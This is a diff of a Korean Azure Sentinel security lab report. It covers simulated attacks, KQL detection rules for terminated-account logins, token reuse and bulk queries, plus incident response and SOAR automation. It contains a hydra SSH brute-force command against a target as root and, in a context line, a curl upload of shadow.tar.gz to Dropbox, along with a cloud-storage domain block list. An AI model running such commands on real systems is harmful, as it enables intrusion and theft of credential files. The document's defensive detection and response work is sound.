@@ -4,7 +4,7 @@
 
 1. [개요](#1-개요)
 2. [Microsoft Defender XDR 사용하여 위협 완화](#2-microsoft-defender-xdr-사용하여-위협-완화)
-    *   [2.1 통합 보안 플랫폼 (2025)](#21-통합-보안-플랫폼-2025)
+    *   [2.1 통합 보안 플랫폼](#21-통합-보안-플랫폼)
     *   [2.2 클라우드용 Microsoft Defender](#22-클라우드용-microsoft-defender)
     *   [2.3 Defender for Servers (호스트 행위 탐지)](#23-defender-for-servers-호스트-행위-탐지)
     *   [2.4 제한사항 및 미구현 항목](#24-제한사항-및-미구현-항목)
@@ -23,7 +23,8 @@
 5. [MITRE ATT&CK 기반 종합 공격 조사 시나리오](#5-mitre-attck-기반-종합-공격-조사-시나리오)
     *   [5.1 시나리오 개요: 내부 중요 데이터 유출](#51-시나리오-개요-내부-중요-데이터-유출)
     *   [5.2 단계별 조사 프로세스 (Investigation)](#52-단계별-조사-프로세스-investigation)
-    *   [5.3 대응 방안 및 시사점](#53-대응-방안-및-시사점)
+    *   [5.3 인증 무결성 위반 및 이상 행위 탐지](#53-인증-무결성-위반-및-이상-행위-탐지)
+    *   [5.4 종합 대응 방안 및 시사점](#54-종합-대응-방안-및-시사점)
 6. [보안 사고 대응 및 자동화 (SOAR)](#6-보안-사고-대응-및-자동화-soar)
     *   [6.1 Action Group 알림 구성](#61-action-group-알림-구성)
     *   [6.2 보안 사고 조사 및 종결](#62-보안-사고-조사-및-종결)
@@ -411,7 +412,7 @@ AzureDiagnostics
 
 **공격 실행 (External Kali):**
 ```bash
-hydra -l www -P rockyou.txt ssh://<Target_Public_IP> -t 4
+hydra -l root -P pass.txt ssh://<Target_Public_IP> -t 4
 ```
 
 **탐지 쿼리 (Terraform에서 정의된 실제 Analytics Rule):**
@@ -732,30 +733,178 @@ curl -X POST -F "file=@shadow.tar.gz" https://www.dropbox.com/upload
 >     3.  그래프 화면에서 공격자(IP)와 피해 서버(Host)가 연결된 화면 캡처.
 
 **Step 5. 대응 및 차단 (Response)**
-1.  **네트워크 격리:** Defender for Cloud의 **'JIT VM Access'**를 강제 회수하여 외부 접속 경로 차단.
-2.  **계정 잠금:** 해당 사용자 세션 강제 종료 (`pkill -u www`).
-3.  **정책 강화:** 방화벽(Azure Firewall)에 Cloud Storage 관련 도메인 차단 규칙 업데이트.
+
+**1) 네트워크 격리**
+*   **조치:** NSG Inbound Rules에서 공격자 IP를 Deny 처리.
+*   **경로:** Azure Portal > NSG > Inbound Rules > + Add > Source IP 입력 > Action: Deny > Priority: 100
+
+**2) 계정 잠금**
+```bash
+# 세션 강제 종료
+pkill -u www
+
+# 계정 잠금
+sudo passwd -l www
+```
+
+**3) 정책 강화**
+*   **조치:** Azure Firewall Application Rules에 Cloud Storage 도메인 차단 규칙 추가.
+*   **차단 대상:** `*.dropbox.com`, `*.drive.google.com`, `*.mega.nz`
 
 > [!NOTE] 스크린샷 가이드: 인시던트 대응
 >     1.  NSG 규칙에서 공격자 IP를 차단한 화면 캡처 (Azure Portal > NSG > Inbound rules).
->     2.  Firewall 애플리케이션 규칙에 Dropbox 등 클라우드 스토리지 차단 규칙 추가 화면 캡처.
+>     2.  Firewall 애플리케이션 규칙에 클라우드 스토리지 차단 규칙 추가 화면 캡처.
 
-### 5.3 대응 방안 및 시사점
+### 5.3 인증 무결성 위반 및 이상 행위 탐지
 
-*   **보안 프로세스 정립:** 단순 차단을 넘어, **탐지(Alert) -> 분석(Graph) -> 대응(Response)**으로 이어지는 표준 오퍼레이션 절차(SOP)를 마련함.
-*   **개선점:** 데이터 유출 방지(DLP) 솔루션 도입 필요성 및 중요 사용자 행위 분석(UEBA) 규칙 고도화 필요.
+앞서 식별된 인증 토큰 취약점과 연계하여, **토큰 탈취** 및 **비정상 데이터 유출** 행위를 실시간으로 탐지하기 위한 Sentinel 분석 규칙을 구현했습니다.
+
+#### 5.3.1 위협 탐지 모델
+
+| 탐지 항목 | 설명 | MITRE ATT&CK |
+|:---:|:---|:---:|
+| **비활성 계정 접근** | 퇴사자 또는 장기 미사용 계정의 갑작스러운 로그인 시도 | **T1078** (Valid Accounts) |
+| **토큰 재사용** | 동일한 인증 토큰이 지리적/논리적으로 불가능한 위치에서 동시 사용 | **T1550** (Use Alternate Auth Material) |
+| **데이터 유출** | 업무 외 시간에 대량의 고객 정보(DB) 조회 및 반출 시도 | **T1530** (Data from Cloud Storage) |
+
+#### 5.3.2 KQL 기반 탐지 규칙
+
+**규칙 1: 비활성/종료 계정의 비정상 로그인**
+
+HR 데이터베이스와 연동하여 퇴사자 또는 휴면 계정의 인증 로그가 발생할 경우 즉시 경보를 생성합니다.
+
+```csharp
+let TerminatedUsers = datatable(username:string, termination_date:datetime) [
+    "ex-admin@04www.cloud", datetime(2025-11-01),
+    "ex-dev@04www.cloud", datetime(2025-11-15)
+];
+
+Syslog
+| where TimeGenerated > ago(1h)
+| where SyslogMessage has_any ("Accepted password", "session opened")
+| extend User = extract(@"user\s*[=:]\s*(\S+)", 1, SyslogMessage)
+| join kind=inner (TerminatedUsers) on $left.User == $right.username
+| where TimeGenerated > termination_date
+| project TimeGenerated, User, Computer, termination_date, 
+          DaysAfterTermination = datetime_diff('day', TimeGenerated, termination_date)
+```
+
+**규칙 2: 토큰 복제 및 세션 하이재킹 탐지**
+
+동일한 세션 토큰이 서로 다른 IP 대역에서 동시에 사용되는 패턴을 분석하여 토큰 탈취를 탐지합니다.
+
+```csharp
+AzureDiagnostics
+| where Category == "ApplicationGatewayAccessLog"
+| where requestUri_s contains "admin.php"
+| extend TokenHash = hash_md5(tostring(parse_json(requestHeaders_s)["Cookie"]))
+| summarize 
+    DistinctIPs = dcount(clientIP_s),
+    IPs = make_set(clientIP_s),
+    RequestCount = count()
+    by TokenHash, bin(TimeGenerated, 10m)
+| where DistinctIPs > 1 // 단일 토큰이 다수 IP에서 발견됨
+| project TimeGenerated, TokenHash, DistinctIPs, IPs, RequestCount
+```
+
+**규칙 3: 대량 데이터 조회 탐지**
+```csharp
+// 단시간 내 대량의 고객 정보 조회
+Syslog
+| where ProcessName == "mysqld" or SyslogMessage contains "SELECT"
+| where SyslogMessage has_any ("users", "orders", "personal_info")
+| extend User = extract(@"user\s*[=:]\s*(\S+)", 1, SyslogMessage)
+| summarize 
+    QueryCount = count(),
+    TablesAccessed = make_set(extract(@"FROM\s+(\w+)", 1, SyslogMessage))
+    by User, Computer, bin(TimeGenerated, 5m)
+| where QueryCount > 50
+| project TimeGenerated, User, Computer, QueryCount, TablesAccessed
+```
+
+> [!NOTE] 스크린샷 가이드: 이상 행위 탐지 결과
+> *   **Image 1 (퇴사자 접근):**
+>     1.  Sentinel > Logs 메뉴에서 **Rule 1 (비활성/종료 계정)** 쿼리 실행.
+>     2.  `ex-admin@04www.cloud` 사용자의 로그인 시도가 탐지된 결과 테이블 캡처.
+> *   **Image 2 (토큰 재사용):**
+>     1.  **Rule 2 (토큰 복제)** 쿼리 실행.
+>     2.  동일 `TokenHash`가 서로 다른 `DistinctIPs` (2개 이상)에서 발견된 결과 화면 캡처.
+
+#### 5.3.3 대응 자동화
+
+탐지된 위협에 대해 즉각적인 차단을 수행하는 자동화 워크플로우를 구성했습니다.
+
+**1) Sentinel Automation Rule 기반 자동화**
+Terraform으로 배포된 자동화 규칙:
+*   **Trigger:** High Severity 인시던트 생성
+*   **Action 1:** 인시던트 소유자 자동 할당 (보안팀)
+*   **Action 2:** 인시던트 태그 자동 추가 (`auto-response`, `high-priority`)
+*   **Action 3:** Logic App 트리거 (이메일 알림 발송)
+    *   *Azure 구독 제한으로 인해 실제 구현은 이메일 발송에 초점을 맞춤*
+
+> [!NOTE] 스크린샷 가이드: 대응 자동화
+> *   **Image 1 (Logic App 트리거):** Logic App 실행 이력에서 Sentinel 트리거로 인해 성공적으로 실행된 내역.
+> *   **Image 2 (자동 알림 수신):** 보안 담당자가 수신한 인시던트 알림 이메일 (`[Critical] 내부자 위협 탐지`).
+
+#### 5.4.5 대응 결과 및 교훈
+
+| 단계 | 소요 시간 | 조치 내용 |
+|------|----------|----------|
+| **탐지** | 15분 | Sentinel 분석 규칙이 퇴사자 계정 로그인 감지 |
+| **알림** | 즉시 | Logic App에서 Office 365 이메일 발송 |
+| **대응** | 10분 | NSG IP 차단 + Key Vault 서명키 회전 수행 |
+| **조사** | 30분 | Investigation Graph로 유출 범위 확인 |
+| **완료** | 55분 | 인시던트 종결 및 보고서 작성 |
+
+**교훈 및 개선점:**
+1. **퇴직자 프로세스 강화:** HR 시스템과 Entra ID 연동하여 퇴사 즉시 계정 비활성화
+2. **서명키 자동 회전:** Key Vault Rotation Policy로 90일마다 자동 갱신
+3. **세션 검증 추가:** DB 기반 토큰 유효성 검증 로직 구현 필요
+4. **UEBA 도입:** 사용자 행동 기준선(Baseline) 학습 및 이상 탐지 고도화
+
+> [!NOTE] 스크린샷 가이드: 내부자 위협 탐지
+> *   **Image 1 (인시던트):** Sentinel Incidents에서 'Terminated User Account Activity' 경보가 High 심각도로 발생한 화면.
+> *   **Image 2 (Investigation):** Investigation Graph에서 퇴사자 계정 → 서버 → DB 테이블이 연결된 그래프 화면.
+> *   **Image 3 (알림):** Logic App에서 발송된 알림 이메일 수신 화면.
 
 ---
 
 ## 6. 보안 사고 대응 및 자동화 (SOAR)
 
-### 6.1 Action Group 알림 구성
+### 6.1 보안 자동화 아키텍처 (SOAR Workflow)
 
-**구성:**
-- Sentinel 인시던트 발생 시 Azure Monitor Alert Rule 트리거
-- Action Group을 통해 보안 담당자에게 이메일 발송
+Azure Sentinel의 Automation Rule과 Logic App을 결합하여, 위협 탐지부터 알림 및 대응까지의 과정을 자동화했습니다.
 
-**수신 이메일 예시:**
+**통합 대응 워크플로우:**
+
+```mermaid
+graph TD
+    A["🔔 Sentinel Incident Trigger"] -->|Automation Rule| B(인시던트 자동 관리)
+    
+    subgraph "자동 관리 (Sentinel)"
+    B -- 소유자 할당 --> B1["보안팀(SecOps) 할당"]
+    B -- 태그 추가 --> B2["Tag: Auto-Response"]
+    end
+    
+    B -->|Logic App| C["📧 이메일 알림 발송"]
+    C --> D{보안 담당자 조치}
+    
+    subgraph "대응 절차"
+    D --> E["NSG IP 차단"]
+    D --> F["Key Vault 서명키 회전"]
+    D --> G["계정 잠금"]
+    end
+```
+
+**구성 요소:**
+1.  **Automation Rule:** 인시던트 발생 시 소유자 할당, 태그 추가, Logic App 트리거.
+2.  **Logic App:** Office 365와 연동하여 상세 침해 정보를 보안팀에게 이메일로 전송.
+
+> [!NOTE] 스크린샷 가이드: 자동화 설정
+> *   **Image 1 (Automation Rule):** Sentinel > Automation 메뉴에서 활성화된 규칙 목록.
+> *   **Image 2 (Logic App):** Sentinel 트리거와 이메일 발송 액션이 연결된 디자이너 화면.
+
+**수신 알림 이메일 예시:**
 ```
 From: Microsoft Azure <azure-noreply@microsoft.com>
 Subject: 🔴 [High Severity] Azure Sentinel Incident - SSH Brute Force
@@ -766,7 +915,7 @@ INCIDENT DETAILS
 • Name: SSH Brute Force Attack
 • Severity: High
 • Time: 2024-12-11 14:10:05 (KST)
-• Status: New
+• Status: New / Assigned to SecOps
 
 ENTITIES INVOLVED
 • Attacker IP: 112.x.x.x
@@ -776,17 +925,11 @@ ENTITIES INVOLVED
 RECOMMENDED ACTIONS
 1. Block attacker IP in NSG/Firewall
 2. Check for successful logins
-3. Review target account integrity
+3. Review target account integrity (Password Reset)
 
 [View in Azure Portal]
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ```
-
-> [!NOTE] 스크린샷 가이드: 자동 알림 이메일
-> *   **Image:**
->     1.  Outlook 또는 수신 이메일함 접속.
->     2.  발신자가 **'Microsoft Azure'**이고 제목에 **'Azure Sentinel Incident'**가 포함된 메일 클릭.
->     3.  메일 본문의 공격 정보(IP, 시간 등)가 잘 보이도록 펼쳐서 캡처.
 
 ### 6.2 보안 사고 조사 및 종결
 
@@ -805,8 +948,8 @@ RECOMMENDED ACTIONS
 14:11:05 ┃ 📧 알림
          ┃   └─ 보안 담당자 이메일 발송 (자동)
          │
-14:13:00 ┃ 🛡️ 대응 (수동)
-         ┃   └─ 담당자가 NSG에서 공격자 IP 차단
+14:13:00 ┃ 🛡️ 대응
+         ┃   └─ NSG 차단, Key Vault 회전, 계정 잠금 수행
          │
 14:15:00 ┃ ✅ 종결
          ┃   └─ 인시던트 상태 'Closed'로 변경
